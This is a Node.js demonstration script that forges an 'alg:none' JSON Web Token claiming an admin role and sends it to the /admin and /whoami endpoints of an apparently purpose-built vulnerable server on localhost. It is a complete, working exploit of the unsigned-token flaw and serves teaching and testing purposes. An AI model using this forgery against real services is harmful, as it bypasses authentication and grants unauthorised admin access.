// scripts/forge_attack.js
// This script demonstrates the 'alg:none' JWT vulnerability against vuln-server.js

const jwt = require('jsonwebtoken');
const axios = require('axios'); // Requires 'npm install axios'

const VULN_SERVER_URL = 'http://localhost:1234'; // Vulnerable server URL

async function forgeAndAttack() {
    console.log("--- Starting JWT 'alg:none' Forgery Attack Demo ---");

    // 1. Forge an "admin" token with alg:none
    const forgedPayload = {
        sub: "forged_admin",
        role: "admin",
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + (60 * 60) // 1 hour expiry
    };

    // The header is crucial for the alg:none attack
    const forgedHeader = { "alg": "none", "typ": "JWT" };

    // JWT structure: base64url(header) + "." + base64url(payload) + "."
    // The signature part is empty for 'none' algorithm
    const forgedToken = Buffer.from(JSON.stringify(forgedHeader)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '') +
                      '.' +
                      Buffer.from(JSON.stringify(forgedPayload)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '') +
                      '.'; // Empty signature for 'none'

    console.log("\nForged 'alg:none' token:");
    console.log(forgedToken);

    // 2. Attempt to access the /admin endpoint with the forged token
    console.log(`\nAttempting to access ${VULN_SERVER_URL}/admin with forged token...`);
    try {
        const response = await axios.get(`${VULN_SERVER_URL}/admin`, {
            headers: {
                'Authorization': `Bearer ${forgedToken}`
            }
        });
        console.log("\n--- Attack SUCCESSFUL! ---");
        console.log("Response from /admin:", response.data);
        console.log("The 'alg:none' vulnerability allowed access without a valid signature.");
    } catch (error) {
        if (error.response) {
            console.error("\n--- Attack FAILED ---");
            console.error("Server responded with error:", error.response.status, error.response.data);
            console.error("This might happen if the vulnerable server is not running or the vulnerability is patched.");
        } else {
            console.error("\n--- Attack FAILED ---");
            console.error("Could not connect to the vulnerable server. Is it running on", VULN_SERVER_URL, "?");
            console.error(error.message);
        }
    }

    // 3. (Optional) Show /whoami with the forged token
    console.log(`\nAttempting to get /whoami from ${VULN_SERVER_URL} with forged token...`);
    try {
        const response = await axios.get(`${VULN_SERVER_URL}/whoami`, {
            headers: {
                'Authorization': `Bearer ${forgedToken}`
            }
        });
        console.log("Response from /whoami (decoding without verification):", response.data);
    } catch (error) {
        console.error("Error getting /whoami:", error.message);
    }


    console.log("\n--- Demo Complete ---");
}

forgeAndAttack();